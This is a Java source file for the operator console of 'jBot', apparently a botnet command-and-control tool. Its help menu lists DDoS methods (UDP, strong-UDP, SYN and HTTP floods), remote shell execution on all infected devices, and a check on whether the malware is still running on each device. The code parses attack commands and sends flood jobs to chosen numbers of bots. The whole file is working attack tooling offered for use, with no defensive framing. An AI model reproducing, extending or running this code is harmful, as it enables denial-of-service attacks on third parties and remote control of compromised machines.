package me.aaronakhtar.jbot;

import me.aaronakhtar.jbot.objects.Device;
import me.aaronakhtar.jbot.threads.execute.threads.ExecuteHttp;
import me.aaronakhtar.jbot.threads.execute.threads.ExecuteUDP;
import me.aaronakhtar.jbot.utils.Colour;
import me.aaronakhtar.jbot.utils.Terminal;

import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;

@SuppressWarnings("Duplicates")
public class Input {

    public static void get(){
        System.out.print(Colour.BRIGHT_RED.get() + "[" + Colour.RED.get() +new SimpleDateFormat("hh:mm a").format(new Date())+ Colour.BRIGHT_RED.get() +"] " + Colour.RED.get() + "master"+Colour.BRIGHT_WHITE.get()+"@"+Colour.RED.get()+"jBot"+Colour.WHITE.get()+" ~# " + Colour.RESET.get());
        check(new Scanner(System.in).nextLine().split(" "));
    }

    private static void check(String[] args){

        switch (args[0].toLowerCase()){

            case "help":{
                System.out.println(" ");
                System.out.println(Colour.BRIGHT_RED.get() + "'METHODS'  - > Get a list of DDOS attack methods jBot supports.");
                System.out.println("'DOCS'  - > Get the jBot official documentation, this will explain certain features of jBot and more.");
                System.out.println("'EXEC'  - > Execute remote shell commands on all connected devices.");
                System.out.println("'BOTS'  - > Get a list of the bots connected.");
                System.out.println("'ENSURE-CONNECTION'  - > This will refresh the bot count, this command should be used every few hours to ensure inactive devices are removed.");
                System.out.println("'CREDITS'  - > jBot developer credits.");
                System.out.println("'CLEAR'  - > Clear your terminal.");
                System.out.println("'EXIT'  - > Safely exit jBot without causing any issues, this will safely close all running threads etc.");
                System.out.println(" " + Colour.RESET.get());
                break;
            }


            case "methods":{
                System.out.println(" " + Colour.BRIGHT_RED.get());
                System.out.println("'udp [host] [port] [time] [amount_of_bots | all] [bytes_per_packet]'");
                System.out.println("'strong-udp [host] [port] [time] [amount_of_bots | all] [bytes_per_packet]'");
                System.out.println("'syn [host] [port] [time] [amount_of_bots | all]'");
                System.out.println("'http [url] [time] [amount_of_bots | all] [get | post] [threads_per_bot]'");
                System.out.println(" " + Colour.RESET.get());
                break;
            }

            case "credits":{
                System.out.println(" " + Colour.BRIGHT_MAGENTA.get());
                System.out.println("Developer -> Aaron Akhtar [aaronakhtar.me] [tsis.uk] [Reppin The Secret Intelligence Squadron]");
                System.out.println(" " + Colour.RESET.get());
                break;
            }

            case "exit":{
                for (Thread t : JBot.threads){
                    if (t.isAlive()){
                        t.stop();
                    }
                }
                Terminal.clearScreen();
                System.exit(0);
                break;
            }

            case "clear":{
                Terminal.clearScreen();
                break;
            }

            case "bots":{
                System.out.println(" ");
                System.out.println(Colour.BRIGHT_RED.get() + "Connected Devices: " + JBot.devices.size());
                System.out.println(" ");
                break;
            }

            case "ensure-connection":{
                System.out.println(" ");
                List<Device> sf = new ArrayList<>();
                for (Device device : JBot.devices){
                    boolean f =device.isMalwareRunning(); // basically pings device
                    if (f){
                        System.out.println(Colour.GREEN.get() + "Device ["+device.getInetAddress().getHostAddress()+"] is active...");
                    }else{
                        System.out.println(Colour.BRIGHT_RED.get() + "Device ["+device.getInetAddress().getHostAddress()+"] is not active...");
                        sf.add(device);
                    }
                }

                if(!sf.isEmpty()){
                    for (Device s : sf){
                        JBot.devices.remove(s);
                    }
                }

                System.out.println(" ");
                break;
            }

            //methods

            case "udp":{
                if (args.length != 6){
                    System.out.println(Colour.BRIGHT_RED.get() + "'udp [host] [port] [time] [amount_of_bots | all] [bytes_per_packet]'");
                    break;
                }

                if (!args[4].equalsIgnoreCase("all")){

                    int x = 0;
                    try{
                        x = Integer.parseInt(args[4]);
                    }catch (Exception e){
                        System.out.println(Colour.RED.get() + "Invalid Amount of Bots...");
                        break;
                    }
                    int port = 0;
                    int time = 0;
                    int bytes = 0;
                    try{port = Integer.parseInt(args[2]);}catch (Exception e){System.out.println(Colour.RED + "Invalid Port Value..."); break;}
                    try{time = Integer.parseInt(args[3]);}catch (Exception e){System.out.println(Colour.RED + "Invalid Time Value..."); break;}
                    try{bytes = Integer.parseInt(args[5]);}catch (Exception e){System.out.println(Colour.RED + "Invalid Bytes Value..."); break;}

                    if (x > JBot.devices.size()){
                        System.out.println(Colour.RED.get() + "Please enter a amount of bots that is less then or equals to the amount of bots you currently have connected.");
                        break;
                    }
                    List<Thread> threadList = new ArrayList<>();
                    boolean p = false;
                    for (int f =0; f < x; f++){
                        if (f > 100 && p == false){
                            try {
                                Thread.sleep(2000);
                                p = true;
                            }catch (Exception e){}
                        }else if (p == true){
                            p = false;
                        }

                        final Device device = JBot.devices.get(f);
                        threadList.add(new Thread(new ExecuteUDP(args[1],port, time, bytes, device)));
                        threadList.get(f).start();
                       // System.out.println(Colour.GREEN.get() + "Command sent to device: " + device.getInetAddress().getHostAddress() + Colour.RESET.get());
                    }
                }else{
                    int port = 0;
                    int time = 0;
                    int bytes = 0;
                    try{port = Integer.parseInt(args[2]);}catch (Exception e){System.out.println(Colour.RED + "Invalid Port Value..."); break;}
                    try{time = Integer.parseInt(args[3]);}catch (Exception e){System.out.println(Colour.RED + "Invalid Time Value..."); break;}
                    try{bytes = Integer.parseInt(args[5]);}catch (Exception e){System.out.println(Colour.RED + "Invalid Bytes Value..."); break;}

                    List<Thread> threadList = new ArrayList<>();
                    boolean p = false;
                    for (int f =0; f < JBot.devices.size(); f++){
                        if (f > 100 && p == false){
                            try {
                                Thread.sleep(2000);
                                p = true;
                            }catch (Exception e){}
                        }else if (p == true){
                            p = false;
                        }

                        final Device device = JBot.devices.get(f);
                        threadList.add(new Thread(new ExecuteUDP(args[1],port, time, bytes, device)));
                        threadList.get(f).start();
                      //  System.out.println(Colour.GREEN.get() + "Command sent to device: " + device.getInetAddress().getHostAddress() + Colour.RESET.get());
                    }
                }

                break;
            }


            case "http":{
                if (args.length != 6){
                    System.out.println(Colour.BRIGHT_RED.get() + "'http [url] [time] [amount_of_bots | all] [get | post] [threads_per_bot]'");
                    break;
                }
                if (!args[3].equalsIgnoreCase("all")) {
                    String url = args[1];
                    try {
                        new URL(url).toURI();
                    } catch (Exception e) {
                        System.out.println(Colour.BRIGHT_RED + "Invalid URL - Please enter a valid URL.");
                        break;
                    }

                    int x = 0;
                    try {
                        x = Integer.parseInt(args[2]);
                    } catch (Exception e) {
                        System.out.println(Colour.RED.get() + "Invalid Time Value...");
                        break;
                    }


                    int r = 0;
                    try {
                        r = Integer.parseInt(args[3]);
                    } catch (Exception e) {
                        System.out.println(Colour.RED.get() + "Invalid Amount of Bots...");
                        break;
                    }

                    if (r > JBot.devices.size()) {
                        System.out.println(Colour.RED.get() + "Please enter a amount of bots that is less then or equals to the amount of bots you currently have connected.");
                        break;
                    }

                    int t = 0;

                    try{
                        t = Integer.parseInt(args[5]);
                    }catch (Exception e){
                        System.out.println(Colour.RED.get() + "Invalid Threads Value...");
                        break;
                    }

                    if (!args[4].equalsIgnoreCase("GET") && !args[4].equalsIgnoreCase("POST")) {
                        System.out.println(Colour.BRIGHT_RED.get() + "The value '" + args[4] + "' is not a valid HTTP Type, please choose from 'GET' or 'POST'...");
                        break;
                    }


                    List<Thread> threadList = new ArrayList<>();
                    boolean p = false;
                    for (int f = 0; f < r; f++) {
                        if (f > 100 && p == false) {
                            try {
                                Thread.sleep(2000);
                                p = true;
                            } catch (Exception e) {
                            }
                        } else if (p == true) {
                            p = false;
                        }

                        final Device device = JBot.devices.get(f);
                        threadList.add(new Thread(new ExecuteHttp(url, x, args[4],t, device)));
                        threadList.get(f).start();
                        //System.out.println(Colour.GREEN.get() + "Command sent to device: " + device.getInetAddress().getHostAddress() + Colour.RESET.get());
                    }
                }else{
                    String url = args[1];
                    try {
                        new URL(url).toURI();
                    } catch (Exception e) {
                        System.out.println(Colour.BRIGHT_RED + "Invalid URL - Please enter a valid URL.");
                        break;
                    }

                    int x = 0;
                    try {
                        x = Integer.parseInt(args[2]);
                    } catch (Exception e) {
                        System.out.println(Colour.RED.get() + "Invalid Time Value...");
                        break;
                    }
                    int t = 0;

                    try{
                        t = Integer.parseInt(args[5]);
                    }catch (Exception e){
                        System.out.println(Colour.RED.get() + "Invalid Threads Value...");
                        break;
                    }
                    if (!args[4].equalsIgnoreCase("GET") && !args[4].equalsIgnoreCase("POST")) {
                        System.out.println(Colour.BRIGHT_RED.get() + "The value '" + args[4] + "' is not a valid HTTP Type, please choose from 'GET' or 'POST'...");
                        break;
                    }


                    List<Thread> threadList = new ArrayList<>();
                    boolean p = false;
                    for (int f = 0; f < JBot.devices.size(); f++) {
                        if (f > 100 && p == false) {
                            try {
                                Thread.sleep(2000);
                                p = true;
                            } catch (Exception e) {
                            }
                        } else if (p == true) {
                            p = false;
                        }

                        final Device device = JBot.devices.get(f);
                        threadList.add(new Thread(new ExecuteHttp(url, x, args[4],t, device)));
                        threadList.get(f).start();
                       // System.out.println(Colour.GREEN.get() + "Command sent to device: " + device.getInetAddress().getHostAddress() + Colour.RESET.get());
                    }
                }

                break;
            }


        }
        System.out.println(Colour.RESET.get());
        get();
    }

}
